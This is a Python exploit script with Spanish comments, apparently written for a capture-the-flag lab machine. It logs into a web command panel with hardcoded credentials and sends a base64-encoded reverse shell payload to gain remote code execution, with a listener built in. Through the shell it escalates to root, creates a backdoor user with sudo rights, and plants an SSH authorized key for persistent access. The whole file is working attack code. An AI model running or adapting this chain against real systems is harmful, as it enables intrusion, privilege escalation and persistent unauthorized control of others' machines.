import requests as re
import payload as pa # Esto permite usar la funcion que contiene la carga maliciosa
import base64 as ba # Imporamos esta libreria para realizar el encoding y pasar los filtros
import socket # Con esta libreria configuramos nuestro listener (netcat casero)
import time # Para evitar problemas de race condition en nuestro listener
import threading # Necesaria para ejecutar procesos simultaneamente
# Modulos para la ejecucion de comandos en el sistema
import os
import subprocess

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.151.11/login.php'
CREDENCIALES = {
    'username' : 'R1ckRul3s',
    'password' : 'Wubbalubbadubdub',
    'sub' : 'Login'
}

# Defino el ednpoint donde se va a mandar el payload
RCE_ENDPOINT = 'http://10.128.151.11/portal.php'

# Defino las constantes de IP y Puerto para la ejecucion de la llamada y poder recibirla posteriormente
IP_HOST = '192.168.132.194'
PORT_LISTENER = 4445

# Defino la ruta donde se guardara la llave
PATH_LLAVE = "llave_gacker"

# Compruebo si existe la llave, si no, la creo
if not os.path.exists(PATH_LLAVE):
    print(f"No se encontro la llave en la ruta: {PATH_LLAVE}")
    print("Generando par de llaves...")
    subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-f", PATH_LLAVE, "-N", ""])
    print(f"Par de llaves generadas en {PATH_LLAVE}")

# Leemos la llave publica
with open(PATH_LLAVE + ".pub", "r") as llave:
    llave_publica = llave.read().strip() # Eliminamos saltos de linea y evitamos problemas de inyeccion

# En esta funcion se define la ejecucion remota del payload para recibir la llamada desde el server
def ejecutar_comando(payload):
    PAYLOAD_RSHELL = {
        'command' : payload,
        'sub': 'Execute'
    }

    # Mandamos el payload al servidor y anadimos timeout (la ejecucion se quedara congelada ya que es una rshell)
    try:
        rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_RSHELL, timeout=3)
    # Capturamos el timeout, que significa exito!
    except re.exceptions.ReadTimeout:
        return "Reverse Shell lanzada."

# Esta funcion es la que queda a la escucha y pendiente de una conexion para ejecutar la reverse shell y comandos
def listener(puerto):
    # Primero se crea el socket y se configura
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', puerto))
    s.listen(1)
    print(f"Escuchando en el puerto {puerto}...")
    # Esperamos a victima (bloq hasta recibir la llamada de la revshell)
    conexion, direccion = s.accept()
    print(f'Conexión recibida de {direccion[0]}!')
    # Mandamos automaticamente el siguiente comando con .send
    conexion.send(b"sudo su\n") # Escalamos con sudo su ya que cualquier usuario puede elevarse sin passwd
    conexion.send(b"useradd -m -s /bin/bash gacker\n") # Creo un usuario con home y shell
    conexion.send(b"echo 'gacker:gacker' | chpasswd\n") # Se le asigna una contrasena al usuario
    conexion.send(b"usermod -aG sudo gacker\n") # Anadimos el usuario gacker al grupo sudo
    conexion.send(b"mkdir -p /home/gacker/.ssh\n") # Creamos directorio ssh del usuario
    cmd_llave = f"echo '{llave_publica}' > /home/gacker/.ssh/authorized_keys\n"
    conexion.send(cmd_llave.encode()) # Inyectamos la clave previamente almacenada
    conexion.send(b"chmod 700 /home/gacker/.ssh\n") # Permisos para la carpeta de SSH
    conexion.send(b"chmod 600 /home/gacker/.ssh/authorized_keys\n") # Permisos para el archivo de SSH
    conexion.send(b"chown -R gacker:gacker /home/gacker/.ssh\n") # Asignamos la propiedad a gacker
    conexion.send(b"cat /home/gacker/.ssh/authorized_keys\n") # Hacemos un cat de la llave publica almacenada
    conexion.send(b"sudo su gacker\n") # Iniciamos sesion como usuario gacker
    conexion.send(b"whoami\n") # Verificamos que somos gacker
    print("\n" + "-" * 50)
    print("Llave enviada, listo para ejecutar una conexion SSH: ssh -i llave_gacker gacker@10.128.151.11")
    print("-" * 50 + "\n")
    time.sleep(1) # Despues del comando anadimos un sleep para asegurarnos de que lo procese
    # Ahora con .recv y decode almacenamos la respuesta del server y la imprimimos por pantalla
    respuesta_server = conexion.recv(4096).decode() # Aumentamos la cantidad de datos a recolectar
    print(f"El servidor dice que somos: {respuesta_server}")
    # Cerramos la conexion
    conexion.close()
    s.close()
# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
    print('Peticion de login enviada. Verificando...')
    if 'Command Panel' in estado_login.text:
        print(f'Login exitoso! Mostrando las cookies de sesion: {sesion.cookies}')
        # Tras el login exitoso vamos a decirle a la maquina que nos llame direcamente (reverse shell)
        print('-' * 50)
        print("REALIZANDO REVERSE SHELL --> COGIENDO LLAMADA P4445 (Listener)")
        print('-' * 50)
        # Antes de mandar el payload, arrancamos el listener y esperamos 1 segundo evitando race conditions
        hilo = threading.Thread(target=listener, args=(PORT_LISTENER,))
        hilo.start()
        time.sleep(1)
        # Realizo una llamada a la funcion importada de payload as pa (reverse_shell(ip, puerto))
        payload_raw = pa.reverse_shell(IP_HOST, PORT_LISTENER)
        # print(payload_raw) # Prueba del contenido en crudo del payload
        payload_base64 = ba.b64encode(payload_raw.encode()).decode() # Realizamos la conversion necesaria b64
        # Elaboramos el comando que va a ejecutar
        payload_cmd = f"echo '{payload_base64}' | base64 -d | bash"
        print(f"Payload ofuscado listo para enviar...")
        respuesta_payload = ejecutar_comando(payload_cmd)
        print(respuesta_payload)
    else:
        print('Login fallido!')
else:
    print('Error de conexion!')
